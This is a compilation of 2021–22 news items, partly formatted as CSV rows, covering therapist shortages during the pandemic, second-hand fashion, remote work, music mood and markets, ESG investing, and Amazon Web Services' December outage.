As the US heads into the third year of pandemic life, therapists around the country are finding themselves on the front lines of a mental health crisis. Social workers, psychologists and counsellors from every state say they can’t keep up with an unrelenting demand for their services, and many must turn away patients — including children — who are desperate for support. The New York Times asked 1,320 mental health professionals to tell us how their patients were coping as pandemic restrictions eased. General anxiety and depression are the most common reasons patients seek support, but family and relationship issues also dominate therapy conversations. One in four providers said suicidal thoughts were among the top reasons clients were seeking therapy. While there were moments of optimism about telemedicine and reduced stigma around therapy, the responses painted a mostly grim picture of a growing crisis, which several therapists described as a “second pandemic” of mental health problems.

Fashion as an asset class
Everything you own lies on a spectrum, with consumption goods, such as a coffee or newspaper, at one end and investment goods, such as a house or a diamond, at the other. In the middle are durable or “durable-ish” goods, such as cars, coffee tables and washing machines. Once upon a time, wearing second-hand clothes was deemed uncool. These days, it is bang on trend — and lucrative, too. In 2021, some $36bn was spent on pre-owned garments — close to the $30bn spent in fast fashion stores such as Zara or H&M. By 2025 second-hand revenues will be double those of fast fashion. Reselling platforms such as TheRealReal, Vestiaire Collective and Depop are booming: last year saw over 33m new buyers and 36m new sellers of old garb. Some fashionistas are making thousands renting out their clothes on wardrobe-swapping apps. Technology has made it easy and worthwhile to sell old clothes with one woman’s trash being another’s fashion.

WFH is here to stay
There may be no going back to the five-day week in the office, according to a survey of workers in 25 countries. Both employees and managers found working from home during the pandemic was positive for performance and well-being, a report by the Organisation for Economic Co-operation and Development (OECD) found. The proportion of staff teleworking at least one day a week is expected to be much higher than before the pandemic. A separate study by OECD researchers of job postings on the website indeed found that the substantial increase in advertised telework in Covid lockdowns was only reversed modestly when the restrictions were eased. “These results suggest that telework is here to stay, especially in countries with high levels of digital preparedness,” researchers said. A fundamental and lasting shift toward teleworking would have significant implications for the structure of economies, from productivity to worker rights and childcare provision.

Music drives markets
A few researchers studied the impact of 500bn Spotify streams in 40 countries to see if the mood of the music was connected to financial performance in the respective markets. The conclusion? They are correlated. When people listen to happy songs, the market outperforms. “We looked at the United States first and thought that maybe the findings were a fluke. But when we looked at 39 other countries, the results were the same,” said one of the researchers, Alex Edmans of London Business School. “We then looked at mutual fund flows and found similar effects: positive music was associated with inflows.” While some economists have called the paper “fun” yet questioned the importance, Mr Edmans said that it taps into a big question: Does rationality or emotion drive markets? “What if the market is irrational — sentimental? Then the market might be not only factoring in things that shouldn’t matter, like national mood, but also ignoring things that should.”

14,How 2021 became the year of ESG investing,Investors are no longer satisfied with companies delivering shareholder returns without doing more for the environment and society,"Investors concerned about climate change and social justice had a bumper year in 2021, successfully pushing companies and regulators to make changes amid record inflows to funds focused on environmental, social and corporate governance (ESG) issues.
Extreme weather becoming more frequent and events highlighting social justice issues, such as the death of George Floyd in Minneapolis police custody, contributed to ESG rising to the top of the agenda of investors, companies and policymakers.
A record $649 billion poured into ESG-focused funds worldwide through Nov 30, up from the $542bn and $285bn that flowed into these funds in 2020 and 2019, respectively, the latest Refinitiv Lipper data shows. ESG funds now account for 10 per cent of worldwide fund assets.
Stocks of companies rated highly for their sustainability efforts also notched gains. The MSCI World ESG Leaders’ index has risen 22pc so far this year, compared with the MSCI World Index’s gain of 15pc.
Investors flexed their muscle to challenge companies’ ESG credentials, culminating in a landmark board challenge against oil major Exxon Mobil Corp. Support for social and environmental proposals at the shareholder meetings of US companies rose to 32pc in 2021 from 27pc in 2020 and 21pc in 2017, according to the Sustainable Investments Institute.

Investors are no longer satisfied with companies delivering shareholder returns without doing more for the environment and society

“It was a watershed year,” said Tim Smith, a director at investment management firm Boston Trust Walden.
He contrasted the votes this year with one of the earliest corporate social policy measures, in 1971, when only 1pc of General Motors’ shareholders backed an investor resolution for the automaker to withdraw from South Africa over the country’s racist social policies at the time.
Regulators have responded to the new pressure by making ESG disclosures a priority. The US Securities and Exchange Commission (SEC) has been asking money managers about the ESG classifications they use for their funds and is expected to firm up guidance on corporate disclosures such as carbon emissions.
The European Commission has finalised most of its “sustainable finance taxonomy” rulebook on which corporate activities can be labelled climate-friendly. Rules will apply to some sectors in the European Union starting next month.
Of the $6.1 trillion in ESG funds, 59pc of the money is held in Europe, the Middle East and Africa, according to Lipper, reflecting the region’s earlier embrace of the investing trend.
Inflows in European ESG funds dropped in 2021, but this was more than offset by rising flows into US and Asian ESG funds.
Major wins for ESG investors pushing for changes at companies this year included the replacement of three directors at Exxon Mobil, the rejection of a $230 million pay package for General Electric Co’s CEO Lawrence Culp, and a successful call for Union Pacific to make public its workforce diversity statistics.
Catherine Winner, global head of stewardship at Goldman Sachs Group Inc’s asset management division, which backed the critical shareholder efforts at those three companies, said investors are no longer satisfied with companies delivering shareholder returns without doing more for the environment and society.
“It’s not just about shareholders; it’s about all stakeholders,” she said.
ESG setbacks
To be sure, ESG investors also suffered blows in 2021. Shareholder resolutions that drew significant support but did not gain majorities included a call to reform employment arbitration procedures at Tesla Inc and a call for Amazon.com Inc to review how it addresses racial justice and equity.
Many top corporate investors warmed up to ESG resolutions, even if they did not back them most of the time. Out of 49 climate-related resolutions this year, BlackRock Inc supported 41pc, up from 10pc of a similar set of resolutions in 2020, according to advocacy group Ceres. Vanguard funds increased their support to 37pc from 14pc.
Both major index fund companies declined to comment on the Ceres report. But they have previously said companies must have appropriate risk oversight of environmental and social issues, and that they try to be transparent about their views.
In the United States, companies can sometimes avoid putting shareholder resolutions to a vote by asking the SEC for permission. 
Thomas Skulski, managing director at proxy solicitor Morrow Sodali, said the SEC strengthened the hand of ESG investors in November by narrowing the circumstances under which companies can skip votes.
As a result, companies next year could face more challenges on operational issues, such as how they use consumer packaging or plastics, Mr Skulski said.

15,What caused Amazon’s outage?,"Amazon has still said nothing about what, exactly, went wrong in the early December outage.","Robotic vacuum cleaners wouldn’t start. Doorbell cameras stopped watching for package thieves, though some of those deliveries were canceled anyway. Netflix and Disney movies got interrupted and The Associated Press had trouble publishing the news.
A major outage in Amazon's cloud computing network on Dec 7 severely disrupted services at a wide range of US companies for hours, raising questions about the vulnerability of the internet and its concentration in the hands of a few firms.
That uncertainty was underscored when Amazon reported another outage last week that, while much shorter and less disruptive than the Dec. 7 problem, still created problems for many of its cloud customers. On a status dashboard for the service, Amazon reported that a power failure in one of its data centres had disrupted customers whose tasks ran on its servers.
Power was restored after about 45 minutes, although the company said some customers continued to experience problems almost 12 hours following the outage. Hardware failures in the affected data centre forced some Amazon customers to restart their cloud-based systems entirely.
How did it happen?
Amazon has still said nothing about what, exactly, went wrong in the early December outage. The company limited its communications at the time to terse technical explanations on an Amazon Web Services dashboard and a brief statement delivered via spokesperson Richard Rocha that acknowledged the outage had affected Amazon's own warehouse and delivery operations but said the company was working to resolve the issue as quickly as possible. 

Among the most influential organisations to rethink its approach of depending on a single cloud provider was the Pentagon, which canceled a disputed cloud-computing contract with Microsoft that could eventually have been worth $10bn

The incident at Amazon Web Services mostly affected eastern US, but still impacted everything from airline reservations and auto dealerships to payment apps and video streaming services to Amazons own massive e-commerce operation.
What is AWS?
Amazon Web Services is a cloud-service operation it stores its customers’ data, runs their online activities and more and a huge profit centre for Amazon. It holds roughly 40 per cent of the $64 billion global cloud infrastructure market, a larger share than its closest rivals Microsoft, Alibaba and Google, combined, according to research firm Gartner.
It was formerly run by Amazon CEO Andy Jassy, who succeeded founder Jeff Bezos in July.
Too many eggs in one basket?
Some cybersecurity experts have warned for years about the potentially ugly consequences of allowing a handful of big tech companies to dominate key internet operations.
“The latest AWS outage is a prime example of the danger of centralised network infrastructure,” said Sean O’Brien, a visiting lecturer in cybersecurity at Yale Law School. “Though most people browsing the internet or using an app don’t know it, Amazon is baked into most of the apps and websites they use each day.” 
Mr O’Brien said it’s important to build a new network model that resembles the peer-to-peer roots of the early internet. Big outages have already knocked huge swaths of the world offline, as happened during an October Facebook incident.
Even under the current model, companies do have some options to split their services between different cloud providers, although it can be complicated, or to at least make sure they can move their services to a different region run by the same provider.  
“Which means if you had critical systems only available in that region, you were in trouble,” said Servaas Verbiest, lead cloud evangelist at Sungard Availability Services. “If you heavily embraced the AWS ecosystem and are locked into using solely their services and functions, you must ensure you balance your workloads between regions.” 
Hasn’t this happened before?
Yes. The last major AWS outage was in November 2020. There have been been numerous other disruptive and lengthy internet outages involving other providers. In June, the behind-the-scenes content distributor Fastly suffered a failure that briefly took down dozens of major internet sites including CNN, The New York Times and Britain’s government home page. Another that month affected provider Akamai during peak business hours in Asia in June.
In the October outage, Facebook now known as Meta Platforms blamed a faulty configuration change for an hours-long worldwide outage that took down Instagram and WhatsApp in addition to its titular platform.
What about the government?
It was unclear how, or whether, last week’s outage affected governments, but many of them also rely on Amazon and its rivals.
Among the most influential organisations to rethink its approach of depending on a single cloud provider was the Pentagon, which in July canceled a disputed cloud-computing contract with Microsoft that could eventually have been worth $10bn. It will instead pursue a deal with both Microsoft and Amazon and possibly other cloud service providers such as Google, Oracle and IBM.
The National Security Agency (NSA) earlier this year awarded Amazon a contract with a potential estimated value of $10bn to be the sole manager of the NSAs own migration to cloud computing. The contract is known by its agency code name Wild and Stormy. The General Accountability Office in October sustained a bid protest by Microsoft, finding that certain parts of the NSAs decision were unreasonable, although the full decision is classified.
